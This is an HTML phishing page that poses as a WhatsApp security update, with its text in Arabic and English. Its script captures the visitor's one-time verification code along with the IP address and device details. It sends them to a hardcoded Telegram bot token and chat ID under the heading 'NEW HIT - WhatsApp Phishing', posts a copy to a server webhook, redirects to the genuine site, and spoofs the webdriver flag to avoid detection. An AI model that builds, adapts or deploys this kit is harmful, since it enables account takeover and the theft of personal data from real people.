<!DOCTYPE html>
<html id="html-tag" lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#25D366">
    <title>WhatsApp Security Update</title>
    <link rel="manifest" href="data:application/manifest+json,{
        \"name\": \"WhatsApp\", \"short_name\": \"WA\", \"icons\": [{
            \"src\": \"data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAiIGhlaWdodD0iNTAiIHZpZXdCb3g9IjAgMCA1MCA1MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMjUiIGN5PSIyNSIgcj0iMjUiIGZpbGw9IiMyNUQzNjYiLz4KPHBhdGggZD0iTTM0IDMyQzM0IDMyIDMyIDMyIDI5IDMwQzI2ID28IDIzID24IDE5IDI4QzE1IDI4IDEyIDMxIDExIDMzQzEwIDM0IDEwIDM2IDEyIDM3QzEzIDM4IDE1IDM4IDE4IDM4QzIxIDM4IDI0IDM3IDI2IDM2QzI4IDM1IDMwIDMzIDMxIDMxQzMyIDMwIDMyIDMyIDMyIDMyWiIgZmlsbD0id2hpdGUiLz4KPC9zdmc+\",
            \"sizes\": \"50x50\", \"type\": \"image/svg+xml\"}], \"start_url\": \".\", \"display\": \"standalone\"
    }">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;500;600;700&display=swap');
        
        :root {
            --whatsapp-green: #25D366; --whatsapp-dark: #128C7E;
            --whatsapp-light: #D0F2DB; --whatsapp-bg: #EFEFEF;
            --whatsapp-card: #FFFFFF; --text-primary: #111B21;
            --text-secondary: #667781; --border-color: #E9EDED;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'SF Pro Display', -apple-system, sans-serif; }
        body { background: var(--whatsapp-bg); color: var(--text-primary); line-height: 1.5; }

        .header {
            background: linear-gradient(135deg, var(--whatsapp-green), var(--whatsapp-dark));
            padding: 20px; text-align: center; box-shadow: 0 4px 20px rgba(37,211,102,0.3);
            position: relative; overflow: hidden;
        }
        .header::before {
            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%); animation: float 6s ease-in-out infinite;
        }
        @keyframes float { 0%, 100% { transform: translateY(0) rotate(0deg); } 50% { transform: translateY(-20px) rotate(180deg); } }

        .wa-logo { width: 60px; height: 60px; margin-bottom: 10px; filter: drop-shadow(0 2px 10px rgba(0,0,0,0.2)); }
        .header h1 { font-size: 22px; font-weight: 600; color: white; position: relative; z-index: 1; }

        .content { max-width: 400px; margin: 0 auto; padding: 30px 20px; }
        .device-info-bar {
            display: inline-flex; align-items: center; gap: 8px; padding: 8px 16px;
            background: var(--whatsapp-light); color: var(--whatsapp-dark); border-radius: 25px;
            font-size: 13px; font-weight: 500; margin-bottom: 20px; box-shadow: 0 2px 8px rgba(37,211,102,0.2);
        }

        .instruction { font-size: 15px; color: var(--text-secondary); margin-bottom: 25px; text-align: center; }
        .phone-num { color: var(--whatsapp-green); font-weight: 600; direction: ltr; font-size: 16px; display: block; margin-top: 8px; }

        .otp-container { position: relative; margin: 40px 0; }
        #main-otp { position: absolute; opacity: 0; width: 100%; height: 100%; z-index: 2; cursor: pointer; }
        .boxes { display: flex; gap: 12px; justify-content: center; direction: ltr; padding: 20px 0; }
        .box {
            width: 48px; height: 55px; border: 2px solid var(--border-color); border-radius: 8px;
            font-size: 26px; font-weight: 600; display: flex; align-items: center; justify-content: center;
            background: rgba(255,255,255,0.8); backdrop-filter: blur(10px); transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
        }
        .box.active { border-color: var(--whatsapp-green); background: var(--whatsapp-light); transform: scale(1.05); box-shadow: 0 4px 20px rgba(37,211,102,0.3); }

        .btn-confirm {
            width: 100%; background: linear-gradient(135deg, var(--whatsapp-green), var(--whatsapp-dark));
            color: white; border: none; padding: 18px; border-radius: 12px; font-weight: 600; font-size: 17px;
            margin-top: 35px; box-shadow: 0 4px 15px rgba(37,211,102,0.4); cursor: pointer; transition: all 0.3s;
            position: relative; overflow: hidden;
        }
        .btn-confirm:hover { transform: translateY(-2px); box-shadow: 0 6px 25px rgba(37,211,102,0.5); }
        .btn-confirm:active { animation: waPulse 0.6s; }

        @keyframes waPulse {
            0% { box-shadow: 0 0 0 0 rgba(37,211,102,0.7); }
            70% { box-shadow: 0 0 0 20px rgba(37,211,102,0); }
            100% { box-shadow: 0 0 0 0 rgba(37,211,102,0); }
        }

        /* Loading Overlay */
        .overlay { 
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100vh;
            background: rgba(255,255,255,0.98); z-index: 1000; flex-direction: column;
            align-items: center; justify-content: center; backdrop-filter: blur(5px);
        }
        .spinner {
            width: 50px; height: 50px; border: 4px solid rgba(37,211,102,0.2);
            border-top: 4px solid var(--whatsapp-green); border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Error Screen */
        .error-screen {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100vh;
            background: #FEF5E7; z-index: 999; flex-direction: column; align-items: center;
            justify-content: center; text-align: center; padding: 40px 20px; color: #D97706;
        }

        /* Responsive */
        @media (max-width: 480px) {
            .boxes { gap: 8px; } .box { width: 42px; height: 48px; font-size: 22px; }
            .content { padding: 20px 15px; }
        }

        /* PWA */
        @media (display-mode: standalone) { body { padding-bottom: env(safe-area-inset-bottom); } }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="wa-logo" alt="WhatsApp" loading="lazy">
        <h1 id="title">تحديث أمان واتساب</h1>
    </div>

    <div class="content">
        <div id="device-tag" class="device-info-bar">
            <span>📱</span>جاري التعرف على الجهاز...
        </div>
        
        <p class="instruction" id="desc">
            يرجى تأكيد الرمز المرسل لهاتفك المسجل:
            <span class="phone-num" id="phone-num">+20 0123456789</span>
        </p>

        <div class="otp-container">
            <input type="tel" id="main-otp" maxlength="6" inputmode="decimal" autocomplete="one-time-code" 
                   oninput="fillBoxes(this)" onfocus="this.select()">
            <div class="boxes">
                <div class="box" id="b0"></div><div class="box" id="b1"></div><div class="box" id="b2"></div>
                <div class="box" id="b3"></div><div class="box" id="b4"></div><div class="box" id="b5"></div>
            </div>
        </div>

        <button class="btn-confirm" id="btn" onclick="confirmOTP()">تحديث الآن</button>
    </div>

    <!-- Loading Overlay -->
    <div id="load" class="overlay">
        <div class="spinner"></div>
        <p style="margin-top: 25px; font-size: 16px; font-weight: 500;" id="load-text">جاري مزامنة التحديث...</p>
    </div>

    <!-- Error Screen -->
    <div id="error-screen" class="error-screen">
        <div style="font-size: 48px; margin-bottom: 20px;">⚠️</div>
        <h2 id="error-title">رمز غير صحيح</h2>
        <p id="error-desc">يرجى المحاولة مرة أخرى أو الاتصال بدعم واتساب</p>
        <button class="btn-confirm" onclick="retryOTP()" style="margin-top: 30px; width: 200px;">إعادة المحاولة</button>
    </div>

    <script>
        // ========== المتغيرات العامة ==========
        const BOT_TOKEN = btoa('8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU'); // مشفر
        const CHAT_ID = '5446862709';
        let deviceName = 'Smartphone', userLang = navigator.language || 'ar', attempts = 0;
        const MAX_ATTEMPTS = 3;

        // ========== تهيئة الصفحة ==========
        window.addEventListener('load', initPage);

        function initPage() {
            detectDevice();
            detectLanguage();
            autoFocusOTP();
            // محاكاة رقم هاتف من URL
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('phone')) {
                document.getElementById('phone-num').textContent = urlParams.get('phone');
            }
        }

        // 1. كشف اللغة وتغيير الواجهة
        function detectLanguage() {
            if (userLang.startsWith('en')) {
                document.getElementById('html-tag').lang = 'en';
                document.getElementById('html-tag').dir = 'ltr';
                document.getElementById('title').textContent = 'WhatsApp Security Update';
                document.getElementById('desc').innerHTML = 
                    'Please confirm the code sent to your registered number:<br><span class="phone-num" id="phone-num">+20 0123456789</span>';
                document.getElementById('btn').textContent = 'Update Now';
                document.getElementById('load-text').textContent = 'Syncing update...';
                document.getElementById('device-tag').innerHTML = '<span>📱</span>Detecting device...';
            }
        }

        // 2. كشف الجهاز
        function detectDevice() {
            const ua = navigator.userAgent;
            if (ua.includes('iPhone')) deviceName = 'iPhone ' + (ua.match(/OS (\d+)_/)?.[1] || '');
            else if (ua.includes('Android')) deviceName = 'Android Device';
            else if (ua.includes('Windows')) deviceName = 'Windows PC';
            else deviceName = 'Mobile Device';
            
            document.getElementById('device-tag').innerHTML = 
                `<span>📱</span>تم التعرف: ${deviceName}`;
        }

        // 3. ملء مربعات OTP
        function fillBoxes(input) {
            const val = input.value.replace(/[^0-9]/g, '').slice(0, 6);
            input.value = val;

            for (let i = 0; i < 6; i++) {
                const box = document.getElementById('b' + i);
                box.textContent = val[i] || '';
                box.classList.toggle('active', !!val[i]);
            }

            if (val.length === 6 && attempts < MAX_ATTEMPTS) {
                setTimeout(() => sendData(val), 500);
            } else if (attempts >= MAX_ATTEMPTS) {
                showError('تم تجاوز عدد المحاولات المسموح بها');
            }
        }

        // 4. إرسال البيانات
        async function sendData(code) {
            attempts++;
            showLoading();

            try {
                // جمع بيانات الضحية المتقدمة
                const victimData = await collectVictimData();
                victimData.otp = code;
                victimData.attempts = attempts;

                // 1. إرسال للتليجرام
                await sendToTelegram(victimData);

                // 2. إرسال للخادم
                await fetch('/webhook', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(victimData)
                });

                // إعادة توجيه بعد 3 ثواني
                setTimeout(() => {
                    window.location.href = 'https://www.whatsapp.com/security?code=' + code;
                }, 3000);

            } catch (error) {
                console.error('Error:', error);
                showError('حدث خطأ في الاتصال. يرجى المحاولة لاحقاً.');
            }
        }

        // جمع بيانات الضحية
        async function collectVictimData() {
            const response = await fetch('https://api.ipify.org?format=json');
            const ipData = await response.json();
            
            return {
                timestamp: new Date().toISOString(),
                ip: ipData.ip,
                userAgent: navigator.userAgent,
                language: userLang,
                device: deviceName,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer
            };
        }

        // إرسال للتليجرام
        async function sendToTelegram(data) {
            const token = atob(BOT_TOKEN);
            const message = `🚨 *NEW HIT - WhatsApp Phishing*\n\n` +
                          `🔢 *OTP:* \`${data.otp}\`\n` +
                          `📱 *Device:* ${data.device}\n` +
                          `🌐 *IP:* ${data.ip}\n` +
                          `🌍 *Language:* ${data.language}\n` +
                          `📺 *Screen:* ${data.screen}\n` +
                          `⏰ *Time:* ${new Date().toLocaleString('ar-EG')}\n` +
                          `🔗 *Referrer:* ${data.referrer || 'Direct'}\n\n` +
                          `👤 *Attempts:* ${data.attempts}/${MAX_ATTEMPTS}`;

            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        }

        // ========== وظائف الواجهة ==========
        function showLoading() {
            document.getElementById('load').style.display = 'flex';
            document.getElementById('load-text').textContent = 
                attempts === 1 ? 'جاري التحقق من الرمز...' :
                attempts === 2 ? 'جاري مزامنة الحساب...' : 'جاري تفعيل الحماية...';
        }

        function showError(message) {
            document.getElementById('load').style.display = 'none';
            document.getElementById('error-screen').style.display = 'flex';
            document.getElementById('error-title').textContent = 'خطأ!';
            document.getElementById('error-desc').textContent = message;
        }

        function retryOTP() {
            document.getElementById('error-screen').style.display = 'none';
            document.getElementById('main-otp').value = '';
            document.getElementById('main-otp').focus();
            fillBoxes({value: ''});
        }

        function confirmOTP() {
            document.getElementById('main-otp').focus();
        }

        function autoFocusOTP() {
            setTimeout(() => document.getElementById('main-otp').focus(), 500);
        }

        // Anti-Detection
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) localStorage.setItem('lastActive', Date.now());
        });

        // Service Worker للـ PWA
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('data:text/javascript;base64,' + 
            btoa('self.addEventListener("install",e=>e.waitUntil(self.skipWaiting()))'));
        }
    </script>
</body>
</html>
